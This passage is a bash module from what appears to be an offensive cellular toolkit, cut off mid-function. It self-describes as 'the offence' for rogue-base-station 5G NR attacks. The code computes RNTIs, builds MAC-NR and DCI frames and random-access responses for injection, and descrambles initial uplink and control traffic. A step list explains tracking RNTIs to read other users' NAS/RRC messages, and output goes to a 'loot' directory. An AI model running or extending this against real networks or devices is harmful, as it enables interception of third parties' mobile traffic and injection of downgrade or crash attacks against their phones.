#!/usr/bin/env bash
# nr_inject — 5G NR over-the-air shaping: RNTI arithmetic, MAC-NR framing,
# descrambling and the injection exploit set.
#
# SCOPE, first: this is the offence. It computes the RNTIs a shadower must
# track, builds the MAC-NR subheaders and payloads an injector sends, models
# how the initial unencrypted traffic is descrambled once those RNTIs are
# known, and carries the published 5G injection exploits (5Ghoul, TC11, the
# identity/auth-replay/AKA classes). Every byte is constructed here; the send
# itself is a named handoff to a dual-radio rig you own.
#
# Method and shapes from:
#   * Sni5Gect (USENIX Sec '25) — DL/UL injection, identity-request
#     fingerprinting, Registration-Reject downgrade (TC11), auth-replay
#     downgrade, Registration-Accept 5G-AKA bypass
#   * 5Ghoul (IEEE TDSC '25) — stateful multi-layer 5G NR crashes
#   * SF5G — RNTI tracking and descrambling of initial traffic
#
# Attack owned: O1/O17 (rogue base station, NR beam/resource surface).
#
# Resolve IMSISTING_ROOT from this script's own path (MODULE_CONVENTIONS §2).
if [[ -z "${IMSISTING_ROOT:-}" ]]; then
    _sl_src="${BASH_SOURCE[0]}"
    while [ -L "$_sl_src" ]; do
        _sl_dir="$(cd -P "$(dirname "$_sl_src")" && pwd)"
        _sl_tgt="$(readlink "$_sl_src")"
        [[ "$_sl_tgt" != /* ]] && _sl_tgt="$_sl_dir/$_sl_tgt"
        _sl_src="$_sl_tgt"
    done
    IMSISTING_ROOT="$(cd -P "$(dirname "$_sl_src")/.." && pwd)"
    export IMSISTING_ROOT
    unset _sl_src _sl_dir _sl_tgt
fi
if [[ -n "${IMSISTING_ROOT:-}" ]]; then
    _real_home="$(dirname "$IMSISTING_ROOT")"
    if [[ -n "$_real_home" && -d "$_real_home" && "$HOME" != "$_real_home" ]]; then
        export HOME="$_real_home"
    fi
    unset _real_home
fi
: "${IMSISTING_HOME:=$IMSISTING_ROOT}"
: "${TMP_DIR:=/tmp/imsisting}"
: "${LOOT_DIR:=$IMSISTING_ROOT/loot}"
: "${CAPTURES_DIR:=$IMSISTING_ROOT/captures}"
: "${LOGS_DIR:=$IMSISTING_ROOT/logs}"
: "${STATE_DIR:=$IMSISTING_ROOT/state}"
mkdir -p "$TMP_DIR" "$LOOT_DIR" "$CAPTURES_DIR" "$LOGS_DIR" "$STATE_DIR" 2>/dev/null

MOD_TMP="$TMP_DIR/nr_inject"
NRJ_DIR="$LOOT_DIR/nr_inject"
mkdir -p "$MOD_TMP" "$NRJ_DIR" 2>/dev/null

declare -F info >/dev/null 2>&1 || info() { printf '[info] %s\n' "$*" >&2; }
declare -F warn >/dev/null 2>&1 || warn() { printf '[warn] %s\n' "$*" >&2; }
declare -F err  >/dev/null 2>&1 || err()  { printf '[err]  %s\n' "$*" >&2; }
declare -F ok   >/dev/null 2>&1 || ok()   { printf '[ok]   %s\n' "$*" >&2; }
declare -F banner >/dev/null 2>&1 || banner() { :; }

nrj_sanitize() { printf '%s' "${1:-}" | tr '\t\r\n' '   '; }
nrj_norm_hex() { printf '%s' "${1:-}" | tr -d ' \t\r\n:.-' | sed 's/^0x//I' | tr 'A-F' 'a-f'; }
nrj_is_hex() {
    local h; h=$(nrj_norm_hex "${1:-}")
    [[ -n "$h" && "$h" =~ ^[0-9a-f]+$ && $(( ${#h} % 2 )) -eq 0 ]]
}
nrj_byte() { printf '%02X' "$(( ${1:-0} & 0xFF ))" ; }
# Read field K out of a TSV blob. Top-level twin of the selftest's fld().
fld_() { printf '%s\n' "$1" | awk -F'\t' -v k="$2" '$1==k{print $2; exit}'; }

nrj_status_tsv() {
    printf 'MODULE\tnr_inject\n'
    printf 'TARGET\tNR RNTI tracking, MAC-NR framing, descramble, injection exploits\n'
    printf 'BUILDS\treal frames and RNTI arithmetic; the send is a handoff\n'
    printf 'SELFTEST\tyes\n'
}

# ── RNTI arithmetic (TS 38.321 §5.1.3, TS 36.321 §5.1.4) ────────────────
# NR 4-step RA-RNTI = 1 + s_id + 14*t_id + 14*80*f_id + 14*80*8*ul_carrier_id
# LTE RA-RNTI      = 1 + t_id + 10*f_id
nrj_ra_rnti_lte() {
    local t="${1:-}" f="${2:-}"
    [[ "$t" =~ ^[0-9]+$ && "$f" =~ ^[0-9]+$ ]] || { printf 'ERROR\tt_id and f_id must be integers\n' >&2; return 2; }
    printf 'rat\tlte\nra_rnti\t%d\nhex\t%04X\n' "$(( 1 + t + 10*f ))" "$(( 1 + t + 10*f ))"
}
nrj_ra_rnti_nr() {
    local s="${1:-0}" t="${2:-0}" f="${3:-0}" u="${4:-0}"
    local v
    for v in "$s" "$t" "$f" "$u"; do
        [[ "$v" =~ ^[0-9]+$ ]] || { printf 'ERROR\ts_id,t_id,f_id,ul_carrier must be integers\n' >&2; return 2; }
    done
    local r=$(( 1 + s + 14*t + 14*80*f + 14*80*8*u ))
    printf 'rat\tnr\ns_id\t%d\nt_id\t%d\nf_id\t%d\nul_carrier_id\t%d\nra_rnti\t%d\nhex\t%04X\n' \
        "$s" "$t" "$f" "$u" "$r" "$r"
}

# ── MAC-NR subheader (TS 38.321 §6.2.1) ─────────────────────────────────
# 1-octet: R(1) F(1) LCID(6). When F=1 the 8-bit length is replaced by a
# 16-bit length. LCID class: 0 = CCCH, 1..32 = logical channel, else reserved
# in the DL-SCH/UL-SCH tables (MAC CEs live in their own tables).
nrj_lcid_class() {
    local l="${1:-}"
    [[ "$l" =~ ^[0-9]+$ ]] && (( l <= 63 )) || { printf 'ERROR\tLCID must be 0..63\n' >&2; return 2; }
    if (( l == 0 )); then printf 'ccch'
    elif (( l >= 1 && l <= 32 )); then printf 'logical-channel'
    else printf 'reserved-%d' "$l"; fi
}
nrj_lcid_table() {
    cat <<'EOF'
lcid	class	meaning
0	ccch	Common Control Channel
1-32	logical-channel	identity of the logical channel (per the LC configuration)
33-63	reserved	reserved in the DL-SCH/UL-SCH subheader tables; MAC CE LCIDs are listed separately in TS 38.321
EOF
}
nrj_mac_sub() {
    local lcid="${1:-}" len="${2:-0}"
    [[ "$lcid" =~ ^[0-9]+$ ]] && (( lcid <= 63 )) || { printf 'ERROR\tLCID must be 0..63\n' >&2; return 2; }
    [[ "$len" =~ ^[0-9]+$ ]] || { printf 'ERROR\tlength must be numeric\n' >&2; return 2; }
    if (( len <= 255 )); then
        printf '%s%s\n' "$(nrj_byte "$(( (0 << 6) | (lcid & 0x3f) ))")" "$(nrj_byte "$len")"
    else
        printf '%s%04X\n' "$(nrj_byte "$(( (1 << 6) | (lcid & 0x3f) ))")" "$(( len & 0xFFFF ))"
    fi
}
# A MAC-NR PDU: [subheader][body] ... ; here a single SDU for a given LCID.
nrj_mac_pdu() {
    local lcid="${1:-0}" body; body=$(nrj_norm_hex "${2:-}")
    [[ -z "$body" ]] && body="00"
    nrj_is_hex "$body" || { printf 'ERROR\tbody must be hex\n' >&2; return 2; }
    local sub; sub=$(nrj_mac_sub "$lcid" "$(( ${#body} / 2 ))") || return 1
    printf 'lcid\t%s\nclass\t%s\nsubheader\t%s\nbody\t%s\npdu\t%s%s\nbytes\t%d\n' \
        "$lcid" "$(nrj_lcid_class "$lcid")" "$sub" "$body" "$sub" "$body" "$(( (${#sub}+${#body}) / 2 ))"
}

# ── DCI formats (TS 38.212 §7.3) ────────────────────────────────────────
nrj_dci_formats() {
    cat <<'EOF'
format	use
0_0	UL grant, fallback
0_1	UL grant, non-fallback
1_0	DL assignment, fallback
1_1	DL assignment, non-fallback
2_0	slot-format indication (SFI)
2_1	pre-emption indication
2_2	transmit power control (TPC) for PUCCH
2_3	TPC for SRS
EOF
}

# ── Gold pseudo-random sequence (TS 38.211 §5.2.1) ──────────────────────
# Length-31 Gold sequence, the PN generator every NR scrambling, DM-RS and
# hopping sequence is built from:
#   c(n)    = (x1(n + NC) + x2(n + NC)) mod 2
#   x1(n+31) = (x1(n+3) + x1(n)) mod 2
#   x2(n+31) = (x2(n+3) + x2(n+2) + x2(n+1) + x2(n)) mod 2
#   NC = 1600 ; x1(0) = 1, x1(n) = 0 for n = 1..30
#   c_init = sum_{i=0..30} x2(i) * 2^i
# The sequence is emitted LSB-first inside each nibble, which is the order the
# bits are applied to a payload (c(0) to the first bit) and the order NR
# transmits them in.
nrj_gold() {
    local cinit="${1:-}" len="${2:-}"
    [[ "$cinit" =~ ^[0-9]+$ ]] || { printf 'ERROR\tc_init must be an integer\n' >&2; return 2; }
    [[ "$len" =~ ^[0-9]+$ ]] || { printf 'ERROR\tlength must be an integer\n' >&2; return 2; }
    (( cinit < 2147483648 )) || { printf 'ERROR\tc_init must be < 2^31 (TS 38.211 §5.2.1 defines 31 bits)\n' >&2; return 2; }
    (( len >= 1 && len <= 4096 )) || { printf 'ERROR\tlength must be 1..4096\n' >&2; return 2; }

    # Pure-bash LFSR. No awk/python dependency; the module runs where the rest
    # of the toolkit runs. The shift registers hold x(0) in bit 0.
    local x1=1 x2=$cinit
    local n i bit b1 b2 bits="" hex="" acc=0
    for (( n = 0; n < 1600 + len; n++ )); do
        bit=$(( (x1 & 1) ^ (x2 & 1) ))
        b1=$(( ((x1 >> 3) ^ x1) & 1 ))
        b2=$(( ((x2 >> 3) ^ (x2 >> 2) ^ (x2 >> 1) ^ x2) & 1 ))
        x1=$(( ((x1 >> 1) | (b1 << 30)) & 0x7FFFFFFF ))
        x2=$(( ((x2 >> 1) | (b2 << 30)) & 0x7FFFFFFF ))
        (( n >= 1600 )) && bits="$bits$bit"
    done
    # Pack c(0) into the MSB of the first printed nibble, so the hex reads in
    # the same left-to-right order as the bit string above it.
    for (( i = 0; i < len; i++ )); do
        acc=$(( (acc << 1) | ${bits:$i:1} ))
        if (( (i + 1) % 4 == 0 )); then
            hex="$hex$(printf '%X' "$acc")"; acc=0
        fi
    done
    if (( len % 4 != 0 )); then
        acc=$(( acc << (4 - len % 4) ))
        hex="$hex$(printf '%X' "$acc")"
    fi
    printf 'c_init\t%d\nlen\t%d\nbits\t%s\nhex\t%s\nfirst16hex\t%s\n' \
        "$cinit" "$len" "$bits" "$hex" "${hex:0:4}"
}

# ── descrambling (the shadower's payoff) ────────────────────────────────
# Initial NR traffic is scrambled by a Gold sequence seeded from the RNTI, so
# a third party who recovers the RA/TC/C-RNTI chain from the broadcast and
# control channels can read traffic that was never encrypted at all. This
# performs the operation: the sequence is generated from c_init and XORed
# against the block.
#
# c_init, by channel (TS 38.211 §6.3.1.1 PUSCH, §7.3.2.3 PDCCH):
#   pusch : n_RNTI * 2^15 + n_ID       n_ID in 0..1023
#   pdcch : (n_RNTI * 2^16 + n_ID) mod 2^31   n_ID in 0..65535
nrj_scramble_cinit() {
    local ch="${1:-}" rnti="${2:-}" nid="${3:-0}"
    [[ "$rnti" =~ ^[0-9]+$ ]] || return 2
    [[ "$nid" =~ ^[0-9]+$ ]] || nid=0
    case "$ch" in
        pusch) printf '%d' "$(( rnti * 32768 + nid ))" ;;
        pdcch) printf '%d' "$(( (rnti * 65536 + nid) % 2147483648 ))" ;;
        *) return 2 ;;
    esac
}

# XOR a payload against the Gold sequence. hex in, hex out.
nrj_scramble_apply() {
    local hex="${1:-}" cinit="${2:-}" len="${3:-}"
    local n b byte cbit outbyte out="" i
    for (( i = 0; i < len; i += 8 )); do
        byte=$(( 16#${hex:$((i/4)):2} ))
        outbyte=0
        for (( n = 0; n < 8; n++ )); do
            [[ "${_NRJ_CSEQ:$(( i + n )):1}" == "1" ]] && cbit=1 || cbit=0
            b=$(( (byte >> (7 - n)) & 1 ))
            outbyte=$(( outbyte | ((b ^ cbit) << (7 - n)) ))
        done
        out="$out$(nrj_byte "$outbyte")"
    done
    printf '%s' "$out"
}

nrj_descramble() {
    local hex="${1:-}" rnti="${2:-}" slot="${3:-0}" chan="${4:-pusch}" nid="${5:-0}"
    local bits="${6:-}"

    if [[ -z "$hex" ]]; then
        cat <<'EOF'
usage	--descramble <hex> <rnti> [slot] [pusch|pdcch] [n_ID] [laid-out-bits]
rnti_flow	ra-rnti -> tc-rnti -> c-rnti
step1	track the PRACH occasion, compute RA-RNTI (--ra-rnti-nr), read RAR (Msg2)
step2	watch Msg3 scheduled under TC-RNTI, follow contention resolution (Msg4)
step3	on success the network promotes TC-RNTI to C-RNTI; log every value
step4	seed the generator from the RNTI, XOR the observed block, read the NAS/RRC
note	the sequence derives from the RNTI, so a missed RNTI is a missed stream
EOF
        return 0
    fi

    hex=$(nrj_norm_hex "$hex")
    nrj_is_hex "$hex" || { printf 'ERROR\tscrambled block must be hex\n' >&2; return 2; }
    [[ "$rnti" =~ ^[0-9]+$ ]] || { printf 'ERROR\trnti must be an integer\n' >&2; return 2; }
    [[ "$slot" =~ ^[0-9]+$ ]] || { printf 'ERROR\tslot must be an integer\n' >&2; return 2; }
    [[ "$nid" =~ ^[0-9]+$ ]] || nid=0
    case "$chan" in pusch|pdcch) ;; *) printf 'ERROR\tchannel must be pusch or pdcch\n' >&2; return 2 ;; esac
    local nbytes=$(( ${#hex} / 2 ))
    (( nbytes >= 1 && nbytes <= 512 )) || { printf 'ERROR\tblock must be 1..512 bytes\n' >&2; return 2; }

    local cinit; cinit=$(nrj_scramble_cinit "$chan" "$rnti" "$nid") || {
        printf 'ERROR\tchannel must be pusch or pdcch\n' >&2; return 2; }

    # generate the bit sequence straight from the LFSRs, for the exact payload
    local _NRJ_CSEQ="" x1=1 x2=$cinit n bit b1 b2
    for (( n = 0; n < 1600 + nbytes * 8; n++ )); do
        bit=$(( (x1 & 1) ^ (x2 & 1) ))
        b1=$(( ((x1 >> 3) ^ x1) & 1 ))
        b2=$(( ((x2 >> 3) ^ (x2 >> 2) ^ (x2 >> 1) ^ x2) & 1 ))
        x1=$(( ((x1 >> 1) | (b1 << 30)) & 0x7FFFFFFF ))
        x2=$(( ((x2 >> 1) | (b2 << 30)) & 0x7FFFFFFF ))
        (( n >= 1600 )) && _NRJ_CSEQ="$_NRJ_CSEQ$bit"
    done

    local out; out=$(nrj_scramble_apply "$hex" "$cinit" "$(( nbytes * 8 ))")
    printf 'channel\t%s\nchannel_long\t%s\nrnti\t%s\nn_id\t%s\nc_init\t%s\nslot\t%s\nbytes\t%d\nscrambled\t%s\nplaintext\t%s\n' \
        "$chan" "$([[ "$chan" == pusch ]] && echo PUSCH-shared-channel || echo PDCCH-control-channel)" \
        "$rnti" "$nid" "$cinit" "$slot" "$nbytes" "$hex" "$out"

    # Where the caller already laid the block out LSB-first (as NR transmits
    # it), descrambling the laid-out bits is the identity of the XOR above.
    if [[ -n "$bits" ]]; then
        local laid=""
        local i
        for (( i = 0; i < nbytes * 8; i++ )); do
            laid="$laid$(( ${_NRJ_CSEQ:$i:1} ^ ${bits:$i:1} ))"
        done
        printf 'laid_out_in\t%s\nlaid_out_out\t%s\n' "$bits" "$laid"
    fi
}

# ── transport block size (TS 38.214 §5.1.3.2) ───────────────────────────
# Full chain: N_RE = min(156, (12*symb - N_DMRS - N_oh) * n_PRB); N_info =
# N_RE * R * Qm * v; then step 3 (N_info <= 3824, quantise and read
# Table 5.1.3.2-1) or step 4 (quantise, then the 3816/8424 code-block split).
nrj_tbs_table1() {
    printf '%s' "24 32 40 48 56 64 72 80 88 96 104 112 120 128 136 144 152 160 168 176 184 192 208 224 240 256 272 288 304 320 336 352 368 384 408 432 456 480 504 528 552 576 608 640 672 704 736 768 808 848 888 928 984 1032 1064 1128 1160 1192 1224 1256 1288 1320 1352 1416 1480 1544 1608 1672 1736 1800 1864 1928 2024 2088 2152 2216 2280 2408 2472 2536 2600 2664 2728 2792 2856 2976 3104 3240 3368 3496 3624 3752 3824"
}

# MCS index tables (TS 38.214 Table 5.1.3.1-1 and 5.1.3.1-2). Qm and R*1024.
# Table 2 rates are given *10 so 682.5 and 916.5 stay integral.
nrj_mcs_lookup() {
    local tbl="${1:-1}" mcs="${2:-}"
    [[ "$mcs" =~ ^[0-9]+$ ]] || { printf 'ERROR\tIMCS must be an integer\n' >&2; return 2; }
    local -a q r
    if (( tbl == 2 )); then
        (( mcs <= 27 )) || { printf 'ERROR\tIMCS %d is reserved in Table 5.1.3.1-2 (0..27)\n' "$mcs" >&2; return 2; }
        q=(2 2 2 2 2 4 4 4 4 4 4 6 6 6 6 6 6 6 6 6 8 8 8 8 8 8 8 8)
        r10=(1200 1930 3080 4490 6020 3780 4340 4900 5530 6160 6580 4660 5170 5670 6160 6660 7190 7720 8220 8730 6825 7110 7540 7970 8410 8850 9165 9480)
        printf '%d\t%d\n' "${q[$mcs]}" "${r10[$mcs]}"
    else
        (( mcs <= 28 )) || { printf 'ERROR\tIMCS %d is reserved in Table 5.1.3.1-1 (0..28)\n' "$mcs" >&2; return 2; }
        q=(2 2 2 2 2 2 2 2 2 2 4 4 4 4 4 4 4 6 6 6 6 6 6 6 6 6 6 6 6)
        r10=(1200 1570 1930 2510 3080 3790 4490 5260 6020 6790 3400 3780 4340 4900 5530 6160 6580 4380 4660 5170 5670 6160 6660 7190 7720 8220 8730 9100 9480)
        printf '%d\t%d\n' "${q[$mcs]}" "${r10[$mcs]}"
    fi
}

nrj_tbs() {
    local mcs="${1:-}" nprb="${2:-}" nsymb="${3:-14}" noh="${4:-0}" ndmrs="${5:-0}" v="${6:-1}" tbl="${7:-1}"
    local f
    for f in "$mcs" "$nprb" "$nsymb" "$noh" "$ndmrs" "$v" "$tbl"; do
        [[ "$f" =~ ^[0-9]+$ ]] || { printf 'ERROR\tall arguments must be integers\n' >&2; return 2; }
    done
    (( nprb >= 1 && nprb <= 275 )) || { printf 'ERROR\tn_PRB must be 1..275\n' >&2; return 2; }
    (( nsymb >= 1 && nsymb <= 14 )) || { printf 'ERROR\tsymbols must be 1..14\n' >&2; return 2; }
    (( v >= 1 && v <= 4 )) || { printf 'ERROR\tlayers must be 1..4\n' >&2; return 2; }
    (( tbl == 1 || tbl == 2 )) || { printf 'ERROR\tMCS table must be 1 or 2\n' >&2; return 2; }

    local qr; qr=$(nrj_mcs_lookup "$tbl" "$mcs") || return 2
    local qm="${qr%%$'\t'*}" r10="${qr##*$'\t'}"

    local nre_dash=$(( 12 * nsymb - ndmrs - noh ))
    (( nre_dash > 0 )) || { printf 'ERROR\tDM-RS plus overhead consume the whole allocation\n' >&2; return 2; }
    local nre=$(( nre_dash * nprb ))
    (( nre > 156 )) && nre=156

    # N_info carried multiplied by 1024 (ninfo_x / 1024 == N_info), so R —
    # which the tables give as R*1024, itself stored here as r10 = R*10 — and
    # the table-2 half-rates stay exact in integer arithmetic.
    #   ninfo_x = nre * (r10/10) * qm * v / 1024 * 1024 = nre * r10 * qm * v / 10
    local ninfo_x=$(( nre * r10 * qm * v / 10 ))
    local ninfo_i=$(( ninfo_x / 1024 ))
    local ninfo_d=$(( ninfo_x % 1024 * 10 / 1024 ))

    printf 'mcs\t%d\nmcs_table\t%d\nQm\t%d\nR_x1024\t%s\nn_PRB\t%d\nsymbols\t%d\nN_DMRS_PRB\t%d\nN_oh_PRB\t%d\nlayers\t%d\nN_RE_per_PRB\t%d\nN_RE\t%d\nN_info\t%d.%d\n' \
        "$mcs" "$tbl" "$qm" \
        "$(( r10 / 10 )).$(( r10 % 10 ))" \
        "$nprb" "$nsymb" "$ndmrs" "$noh" "$v" "$nre_dash" "$nre" \
        "$ninfo_i" "$ninfo_d"

    if (( ninfo_x <= 3824 * 1024 )); then
        # step 3
        local lg=0 s=1
        while (( s * 2 <= ninfo_i )) && (( lg < 40 )); do s=$(( s * 2 )); lg=$(( lg + 1 )); done
        local n=$(( lg - 6 )); (( n < 3 )) && n=3
        local sh=$(( 1 << n ))
        local npi=$(( sh * (ninfo_i / sh) ))
        (( npi < 24 )) && npi=24
        local tbs=""
        local t
        for t in $(nrj_tbs_table1); do
            if (( t >= npi )); then tbs="$t"; break; fi
        done
        printf 'step\t3\nN_info_prime\t%d\nTBS\t%s\nsource\tTS 38.214 Table 5.1.3.2-1\n' "$npi" "$tbs"
    else
        # step 4
        local ni=$ninfo_i
        local lg=0 s=1
        while (( s * 2 <= ni - 24 )) && (( lg < 40 )); do s=$(( s * 2 )); lg=$(( lg + 1 )); done
        local n=$(( lg - 5 ))
        (( n < 0 )) && n=0
        local sh=$(( 1 << n ))
        # round(x) with ties broken towards the next largest integer
        local x2=$(( (ni - 24) * 2 ))
        local rnd=$(( (x2 + sh) / (2 * sh) ))
        (( (x2 % (2 * sh)) == sh )) && rnd=$(( rnd + 1 ))
        local npi=$(( sh * rnd ))
        (( npi < 3840 )) && npi=3840
        local tbs c
        if (( r10 <= 2560 )); then
            c=$(( (npi + 24 + 3815) / 3816 ))
            tbs=$(( 8 * c * ((npi + 24 + 8 * c - 1) / (8 * c)) - 24 ))
        elif (( npi > 8424 )); then
            c=$(( (npi + 24 + 8423) / 8424 ))
            tbs=$(( 8 * c * ((npi + 24 + 8 * c - 1) / (8 * c)) - 24 ))
        else
            c=1
            tbs=$(( 8 * ((npi + 24 + 7) / 8) - 24 ))
        fi
        printf 'step\t4\nN_info_prime\t%d\nC\t%d\nTBS\t%d\nsource\tTS 38.214 §5.1.3.2 step 4\n' \
            "$npi" "$c" "$tbs"
    fi
}

# ── DCI field breakdown and construction (TS 38.212 §7.3.1.2) ───────────
# Format 1_0 (fallback DL assignment) and 1_1 (non-fallback). Field order
# below is transmission order: the first field occupies the MSBs of Octet 1.
#
# FDRA bitwidth is ceil(log2(N_RB(N_RB+1)/2)); the N_RB that applies is the
# CORESET 0 size (or the initial DL BWP when CORESET 0 is absent) for 1_0
# monitored in a common search space, and the active DL BWP for 1_1.
nrj_fdra_bits() {
    local nrb="${1:-}"
    if ! [[ "$nrb" =~ ^[0-9]+$ ]] || (( nrb < 1 || nrb > 275 )); then
        printf 'ERROR\tN_RB must be 1..275\n' >&2; return 2
    fi
    local target=$(( nrb * (nrb + 1) / 2 ))
    local bits=0 p=1
    while (( p < target )); do p=$(( p * 2 )); bits=$(( bits + 1 )); done
    printf '%d' "$bits"
}

nrj_dci_hex_to_bits() {
    local hex="$1" out="" i k nib
    for (( i = 0; i < ${#hex}; i++ )); do
        nib=$(( 16#${hex:$i:1} ))
        for (( k = 3; k >= 0; k-- )); do out="$out$(( (nib >> k) & 1 ))"; done
    done
    printf '%s' "$out"
}

# name <TAB> width [<TAB> note]
nrj_dci_1_0_layout() {
    local nrb="${1:-24}"
    local fdra; fdra=$(nrj_fdra_bits "$nrb") || return 2
    printf 'identifier\t1\nfdra\t%s\tFDRA\ntdra\t4\tTime domain resource assignment\nvrb_to_prb\t1\tVRB-to-PRB mapping\nmcs\t5\tModulation and coding scheme\nndi\t1\tNew data indicator\nrv\t2\tRedundancy version\nharq_process\t4\tHARQ process number\ndai\t2\tDownlink assignment index\ntpc_pucch\t2\tTPC command for scheduled PUCCH\npucch_resource_indicator\t3\tPUCCH resource indicator\npdsch_to_harq\t3\tPDSCH-to-HARQ_feedback timing indicator\n' "$fdra"
}

# The 1_1 layout carries optional fields whose width the higher layers set.
# Callers pass the widths they have actually configured; the defaults here are
# a plain single-codeword, single-panel, no-CBG configuration.
nrj_dci_1_1_layout() {
    local nrb="${1:-24}" carrier="${2:-0}" bwp="${3:-0}" tdra="${4:-4}" \
          vrb="${5:-1}" prb_bundling="${6:-0}" rate_match="${7:-0}" zp="${8:-0}" \
          tb2="${9:-0}" dai="${10:-2}" p2h="${11:-0}" ant="${12:-4}" tci="${13:-0}" \
          srs="${14:-2}" cbgti="${15:-0}" cbgfi="${16:-0}"
    local fdra; fdra=$(nrj_fdra_bits "$nrb") || return 2
    printf 'identifier\t1\ncarrier_indicator\t%s\nbwp_indicator\t%s\nfdra\t%s\n' \
        "$carrier" "$bwp" "$fdra"
    printf 'tdra\t%s\ntdra_note\t-\n' "$tdra" >/dev/null 2>&1 || true
    printf 'time_domain_resource_assignment\t%s\nvrb_to_prb\t%s\nprb_bundling\t%s\nrate_matching\t%s\nzp_csi_rs\t%s\n' \
        "$tdra" "$vrb" "$prb_bundling" "$rate_match" "$zp"
    printf 'tb1_mcs\t5\ntb1_ndi\t1\ntb1_rv\t2\n'
    (( tb2 == 1 )) && printf 'tb2_mcs\t5\ntb2_ndi\t1\ntb2_rv\t2\n'
    printf 'harq_process\t4\ndai\t%s\ntpc_pucch\t2\npucch_resource_indicator\t3\npdsch_to_harq\t%s\nantenna_ports\t%s\ntci\t%s\nsrs_request\t%s\ncbgti\t%s\ncbgfi\t%s\ndmrs_sequence_init\t1\n' \
        "$dai" "$p2h" "$ant" "$tci" "$srs" "$cbgti" "$cbgfi"
}

nrj_dci_layout() {
    local fmt="${1:-1_0}" nrb="${2:-24}" tb2="${3:-0}"
    case "$fmt" in
        1_0) nrj_dci_1_0_layout "$nrb" ;;
        1_1) nrj_dci_1_1_layout "$nrb" 0 0 4 1 0 0 0 "$tb2" 2 0 4 0 2 0 0 ;;
        *) printf 'ERROR\tformat must be 1_0 or 1_1\n' >&2; return 2 ;;
    esac
}

nrj_dci_parse() {
    local hex="${1:-}" fmt="${2:-1_0}" nrb="${3:-24}"
    [[ -n "$hex" ]] || { printf 'ERROR\tusage: --dci-parse <hex> <1_0|1_1> [N_RB]\n' >&2; return 2; }
    hex=$(nrj_norm_hex "$hex")
    nrj_is_hex "$hex" || { printf 'ERROR\tDCI payload must be hex\n' >&2; return 2; }
    [[ "$nrb" =~ ^[0-9]+$ ]] || { printf 'ERROR\tN_RB must be an integer\n' >&2; return 2; }

    local layout; layout=$(nrj_dci_layout "$fmt" "$nrb") || return 2
    local bits; bits=$(nrj_dci_hex_to_bits "$hex")

    printf 'format\t%s\npayload_hex\t%s\npayload_bits\t%d\nbitstring\t%s\n' \
        "$fmt" "$hex" "${#bits}" "$bits"
    local off=0 name width note val
    while IFS=$'\t' read -r name width note; do
        [[ -n "$name" && "$width" =~ ^[0-9]+$ ]] || continue
        if (( off + width > ${#bits} )); then
            printf 'field\t%s\t-\t-\tTRUNCATED: needs bits %d..%d of %d\n' \
                "$name" "$off" "$(( off + width - 1 ))" "${#bits}"
            break
        fi
        val="${bits:$off:$width}"
        printf 'field\t%s\t%s\t%d\t%s\n' "$name" "$val" "$(( 2#$val ))" "${note:-}"
        off=$(( off + width ))
    done <<< "$layout"
    printf 'bits_consumed\t%d\nbits_remaining\t%d\nsource\tTS 38.212 §7.3.1.2\n' \
        "$off" "$(( ${#bits} - off ))"
}

nrj_dci_encode() {
    local fmt="${1:-}" spec="${2:-}" nrb="${3:-24}"
    [[ -n "$fmt" && -n "$spec" ]] || {
        printf 'ERROR\tusage: --dci-encode <1_0|1_1> <k=v,...> [N_RB]\n' >&2; return 2; }
    [[ "$nrb" =~ ^[0-9]+$ ]] || { printf 'ERROR\tN_RB must be an integer\n' >&2; return 2; }

    local tb2=0 p
    [[ ",$spec," == *",tb2_mcs="* ]] && tb2=1
    local layout; layout=$(nrj_dci_layout "$fmt" "$nrb" "$tb2") || return 2

    local -A want=()
    local -a pairs
    local pair k v width val
    IFS=',' read -ra pairs <<< "$spec"
    for pair in "${pairs[@]}"; do
        [[ -z "$pair" ]] && continue
        [[ "$pair" == *=* ]] || { printf 'ERROR\tbad field spec "%s" (want name=value)\n' "$pair" >&2; return 2; }
        k="${pair%%=*}"; v="${pair#*=}"
        [[ "$k" =~ ^[a-z0-9_]+$ ]] || { printf 'ERROR\tbad field name "%s"\n' "$k" >&2; return 2; }
        [[ "$v" =~ ^[0-9]+$ ]] || { printf 'ERROR\tfield %s must be a decimal value\n' "$k" >&2; return 2; }
        want[$k]="$v"
    done

    local bits="" name note
    while IFS=$'\t' read -r name width note; do
        [[ -n "$name" && "$width" =~ ^[0-9]+$ ]] || continue
        if [[ -n "${want[$name]:-}" ]]; then
            val="${want[$name]}"
            if (( val >= (1 << width) )); then
                printf 'ERROR\tfield %s = %d does not fit in %d bit(s)\n' "$name" "$val" "$width" >&2
                return 2
            fi
            unset "want[$name]"
        elif [[ "$name" == "identifier" ]]; then
            val=1
        else
            val=0
        fi
        for (( p = width - 1; p >= 0; p-- )); do bits="$bits$(( (val >> p) & 1 ))"; done
    done <<< "$layout"

    for k in "${!want[@]}"; do
        printf 'ERROR\t"%s" is not a field of DCI format %s\n' "$k" "$fmt" >&2
        return 2
    done

    local hex="" acc=0 n
    for (( n = 0; n < ${#bits}; n++ )); do
        acc=$(( (acc << 1) | ${bits:$n:1} ))
        if (( (n + 1) % 4 == 0 )); then hex="$hex$(printf '%X' "$acc")"; acc=0; fi
    done
    if (( ${#bits} % 4 != 0 )); then
        acc=$(( acc << (4 - ${#bits} % 4) ))
        hex="$hex$(printf '%X' "$acc")"
    fi
    printf 'format\t%s\nlen\t%d\nbitstring\t%s\nhex\t%s\nsource\tTS 38.212 §7.3.1.2\n' \
        "$fmt" "${#bits}" "$bits" "$hex"
}

# ── MAC Random Access Response (TS 38.321 §6.1.5, §6.2.3) ───────────────
# Fixed 7-octet body, MSB-first across the whole body:
#   R (1) | Timing Advance Command (12) | UL Grant (27) | Temporary C-RNTI (16)
# so Octet 2 straddles the TA field — the classic off-by-nibble.
nrj_rar() {
    local rapid="${1:-}" ta="${2:-}" tcr="${3:-}" grant="${4:-}" e="${5:-0}"
    local f
    for f in "$rapid" "$ta" "$tcr" "$grant" "$e"; do
        [[ "$f" =~ ^[0-9]+$ ]] || { printf 'ERROR\tall arguments must be integers\n' >&2; return 2; }
    done
    (( rapid <= 63 ))        || { printf 'ERROR\tRAPID must be 0..63 (6 bits)\n' >&2; return 2; }
    (( ta <= 4095 ))         || { printf 'ERROR\tTiming Advance Command must be 0..4095 (12 bits)\n' >&2; return 2; }
    (( tcr <= 65535 ))       || { printf 'ERROR\tTemporary C-RNTI must be 0..65535 (16 bits)\n' >&2; return 2; }
    (( grant <= 134217727 )) || { printf 'ERROR\tUL Grant must be 0..2^27-1 (27 bits)\n' >&2; return 2; }
    (( e <= 1 ))             || { printf 'ERROR\tE must be 0 or 1\n' >&2; return 2; }

